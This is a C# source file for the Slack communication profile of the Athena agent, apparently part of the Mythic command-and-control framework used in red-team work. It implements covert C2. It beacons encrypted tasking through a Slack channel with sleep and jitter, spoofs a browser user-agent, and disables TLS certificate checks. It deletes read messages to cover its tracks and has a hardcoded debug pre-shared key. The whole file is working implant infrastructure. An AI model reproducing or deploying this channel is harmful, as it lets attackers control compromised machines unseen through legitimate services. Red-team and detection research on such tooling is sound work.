﻿using Athena.Utilities;
using System;
using System.Net;
using System.Net.Security;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System.Xml.Linq;
using Athena.Models.Config;
using Slack.NetStandard.Auth;
using Slack.NetStandard;
using Slack.NetStandard.WebApi.Chat;
using Slack.NetStandard.Messages;
using Slack.NetStandard.WebApi.Files;
using Slack.NetStandard.Messages.Blocks;
using Slack.NetStandard.WebApi.Conversations;

namespace Athena
{
    public class Config : IConfig
    {
        public IProfile profile { get; set; }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }

        public Config()
        {
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            int sleep = int.TryParse("10", out sleep) ? sleep : 60;
            this.sleep = sleep;
            int jitter = int.TryParse("10", out jitter) ? jitter : 10;
            this.jitter = jitter;
            this.profile = new Slack();

        }
    }

    public class Slack : IProfile
    {
        public string uuid { get; set; }
        public bool encrypted { get; set; }
        public PSKCrypto crypt { get; set; }
        public string psk { get; set; }
        public bool encryptedExchangeCheck { get; set; }
        private string messageToken { get; set; }
        private string channel { get; set; }
        private int messageChecks { get; set; } //How many times to attempt to send/read messages before assuming a failure
        private int timeBetweenChecks { get; set; } //How long (in seconds) to wait in between checks
        private string userAgent { get; set; }
        public string proxyHost { get; set; }
        public string proxyPass { get; set; }
        public string proxyUser { get; set; }
        private string agent_guid = Guid.NewGuid().ToString();
        private SlackWebApiClient client { get; set; }

        public Slack()
        {
#if DEBUG
            this.psk = " yKvIiu9lDmdNLAh/xp/lQl9zM5+NY5k0ySiNvqxAyEw=";
            this.encryptedExchangeCheck = bool.Parse("false");
            this.messageToken = "";
            this.channel = "C03F752RT5E";
            this.userAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
            this.messageChecks = int.Parse("3");
            this.timeBetweenChecks = int.Parse("10");
            this.proxyHost = ":";
            this.proxyPass = "";
            this.proxyUser = "";
            this.uuid = "8990dccf-de61-4111-b801-f4df84b0d43e";
#else

            this.psk = "AESPSK";
            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
            this.messageToken = "slack_message_token";
            this.channel = "slack_channel_id";
            this.userAgent = "user_agent";
            this.messageChecks = int.Parse("message_checks");
            this.timeBetweenChecks = int.Parse("time_between_checks");
            this.proxyHost = "proxy_host:proxy_port";
            this.proxyPass = "proxy_pass";
            this.proxyUser = "proxy_user";
            this.uuid = "%UUID%";

#endif

            //Might need to make this configurable
            ServicePointManager.ServerCertificateValidationCallback =
                   new RemoteCertificateValidationCallback(
                        delegate
                        { return true; }
                    );
            HttpClientHandler handler = new HttpClientHandler();
            this.client = new SlackWebApiClient(this.messageToken);
            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(this.uuid, this.psk);
                this.encrypted = true;
            }

            if (!string.IsNullOrEmpty(this.proxyHost) && this.proxyHost != ":")
            {
                WebProxy wp = new WebProxy()
                {
                    Address = new Uri(this.proxyHost)
                };

                if (!string.IsNullOrEmpty(this.proxyPass) && !string.IsNullOrEmpty(this.proxyUser))
                {
                    handler.DefaultProxyCredentials = new NetworkCredential(this.proxyUser, this.proxyPass);
                }
                handler.Proxy = wp;
            }

            this.client = new SlackWebApiClient(new HttpClient(handler), token: this.messageToken);

            if (!string.IsNullOrEmpty(this.userAgent))
            {
                this.client.Client.DefaultRequestHeaders.UserAgent.ParseAdd(this.userAgent);
            }

            this.client.Conversations.Join(this.channel);
        }
        public async Task<string> Send(object obj)
        {
            string json;
            try
            {
                json = JsonConvert.SerializeObject(obj);
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = await Misc.Base64Encode(this.uuid + json);
                }

                int i = 0;


                while (!await SendSlackMessage(json))
                {
                    if (i == this.messageChecks)
                    {
                        return String.Empty;
                    }
                    i++;
                }

                Dictionary<string, MythicMessageWrapper> result;
                json = String.Empty;
                i = 0;

                //Give the server a second to respond.

                result = await GetSlackMessages();

                //We should only be getting one message back so this is likely unneeded also
                //But just in case I ever need it later, use LINQ to select unique messages from the result in the event we accidentally receive double messages.
                //Still not right, if we send a command and a task result this is still valid but still fucks up the json
                //Probably just going to take the first item
                //foreach (var message in result.Reverse().FirstOrDefault())
                //{
                //    json += message.Value.message;
                //}


                //Take only the most recent response in case some messages got left over.
                //This may cause issues in the event I need to implement slack message chunking, but with current max values it should be fine.
                if (result.FirstOrDefault().Value is not null)
                {
                    json = result.FirstOrDefault().Value.message;
                }
                else
                {
                    return String.Empty;
                }

                //Delete the messages we've read successfully and indicate we're not waiting for a response anymore
                DeleteMessages(result.Keys.ToList());
                if (this.encrypted)
                {
                    return this.crypt.Decrypt(json);
                }

                if (!string.IsNullOrEmpty(json))
                {
                    return (await Misc.Base64Decode(json)).Substring(36);
                }
                return String.Empty;
            }
            catch (Exception e)
            {
                return String.Empty;
            }
        }
        private async Task<bool> SendSlackMessage(string data)
        {
            MythicMessageWrapper msg;
            if (data.Count() > 3850)
            {
                msg = new MythicMessageWrapper()
                {
                    sender_id = this.agent_guid,
                    message = String.Empty,
                    to_server = true,
                    id = 1,
                    final = true
                };
                var request = new FileUploadRequest
                {
                    Channels = this.channel,
                    Title = "",
                    InitialComment = JsonConvert.SerializeObject(msg),
                    Content = data,
                    Filetype = "txt"
                };

                var res = await this.client.Files.Upload(request);

                return res.OK;
            }
            else
            {
                var request = new PostMessageRequest
                {
                    Channel = this.channel,
                };

                msg = new MythicMessageWrapper()
                {
                    sender_id = this.agent_guid,
                    message = data,
                    to_server = true,
                    id = 1,
                    final = true
                };

                request.Blocks.Add(new Section
                {
                    Text = new PlainText(JsonConvert.SerializeObject(msg))
                });


                var result = await client.Chat.Post(request);

                return result.OK;

            }
        }

        private async Task DeleteMessages(List<string> messages)
        {
            // This works for the current implemenation but may have to change in the event I need to further chunk messages.
            messages.ForEach(async message =>
            {
                await this.client.Chat.Delete(this.channel, message);
            });
        }
        private async Task<Dictionary<string, MythicMessageWrapper>> GetSlackMessages()
        {
            Dictionary<string, MythicMessageWrapper> messages = new Dictionary<string, MythicMessageWrapper>();

            for (int i = 0; i < this.messageChecks; i++)
            {
                var request = new ConversationHistoryRequest
                {
                    Channel = this.channel,
                    Limit = 200,
                };
                await Task.Delay(this.timeBetweenChecks * 1000);

                var conversationsResponse = await this.client.Conversations.History(request);

                if (conversationsResponse.OK)
                {
                    conversationsResponse.Messages.ToList<Message>().ForEach(async message =>
                    {
                        try
                        {
                            if (message.Text.Contains(this.agent_guid))
                            {
                                MythicMessageWrapper mythicMessage = JsonConvert.DeserializeObject<MythicMessageWrapper>(message.Text);

                                if (!mythicMessage.to_server && mythicMessage.sender_id == this.agent_guid)
                                {
                                    if (String.IsNullOrEmpty(mythicMessage.message))
                                    {
                                        var res = await this.client.Client.GetAsync(message.Files.FirstOrDefault().UrlPrivateDownload);


                                        mythicMessage.message = await res.Content.ReadAsStringAsync();
                                        messages.Add(message.Timestamp, mythicMessage);
                                    }
                                    else
                                    {
                                        messages.Add(message.Timestamp, mythicMessage);
                                    }
                                }
                            }

                        }
                        catch (Exception e)
                        {
                        }
                    });
                }
                if (messages.Count > 0) //we got something for us
                {
                    break;
                }
            }

            return messages;
        }
    }

    public class MythicMessageWrapper
    {
        public string message { get; set; } = String.Empty;
        public string sender_id { get; set; } //Who sent the message
        public bool to_server { get; set; }
        public int id { get; set; }
        public bool final { get; set; }
    }
    //public class SendMessage
    //{
    //    public string token { get; set; }
    //    public string channel { get; set; }
    //    public string text { get; set; }
    //    public string username { get; set; }
    //    public string icon_url { get; set; }
    //    public string icon_emoji { get; set; }
    //}
    //public class SlackMessage
    //{
    //    public string type { get; set; }
    //    public string text { get; set; }
    //    public List<SlackFile> files { get; set; }
    //    public bool upload { get; set; }
    //    public string user { get; set; }
    //    public bool display_as_bot { get; set; }
    //    public string ts { get; set; }
    //    public string subtype { get; set; }
    //    public string username { get; set; }
    //    public string bot_id { get; set; }
    //    public string app_id { get; set; }
    //}
    //public class ResponseMetadata
    //{
    //    public string next_cursor { get; set; }
    //}
    //public class ConversationHistoryResponse
    //{
    //    public bool ok { get; set; }
    //    public List<SlackMessage> messages { get; set; }
    //    public bool has_more { get; set; }
    //    public int pin_count { get; set; }
    //    public ResponseMetadata response_metadata { get; set; }
    //}
    //public class SlackFile
    //{
    //    public string id { get; set; }
    //    public int created { get; set; }
    //    public int timestamp { get; set; }
    //    public string name { get; set; }
    //    public string title { get; set; }
    //    public string mimetype { get; set; }
    //    public string filetype { get; set; }
    //    public string pretty_type { get; set; }
    //    public string user { get; set; }
    //    public bool editable { get; set; }
    //    public int size { get; set; }
    //    public string mode { get; set; }
    //    public bool is_external { get; set; }
    //    public string external_type { get; set; }
    //    public bool is_public { get; set; }
    //    public bool public_url_shared { get; set; }
    //    public bool display_as_bot { get; set; }
    //    public string username { get; set; }
    //    public string url_private { get; set; }
    //    public string url_private_download { get; set; }
    //    public string media_display_type { get; set; }
    //    public string permalink { get; set; }
    //    public string permalink_public { get; set; }
    //    public bool is_starred { get; set; }
    //    public bool has_rich_preview { get; set; }
    //}
    //public class ReactionMessage
    //{
    //    public string client_msg_id { get; set; }
    //    public string type { get; set; }
    //    public string text { get; set; }
    //    public string user { get; set; }
    //    public string ts { get; set; }
    //    public string team { get; set; }
    //    public List<Block> blocks { get; set; }
    //    public List<Reaction> reactions { get; set; }
    //    public string permalink { get; set; }
    //}
    //public class Reaction
    //{
    //    public string name { get; set; }
    //    public List<string> users { get; set; }
    //    public int count { get; set; }
    //}
    //public class ReactionResponseMessage
    //{
    //    public bool ok { get; set; }
    //    public string type { get; set; }
    //    public ReactionMessage message { get; set; }
    //    public string channel { get; set; }
    //}
    //public class Block
    //{
    //    public string type { get; set; }
    //    public string block_id { get; set; }
    //    public List<Element> elements { get; set; }
    //}
    //public class Element
    //{
    //    public string type { get; set; }
    //    public List<Element> elements { get; set; }
    //    public string text { get; set; }
    //}
    //public class FileUploadFile
    //{
    //    public int timestamp { get; set; }
    //}
    //public class FileUploadResponse
    //{
    //    public bool ok { get; set; }
    //    public FileUploadFile file { get; set; }
    //}
}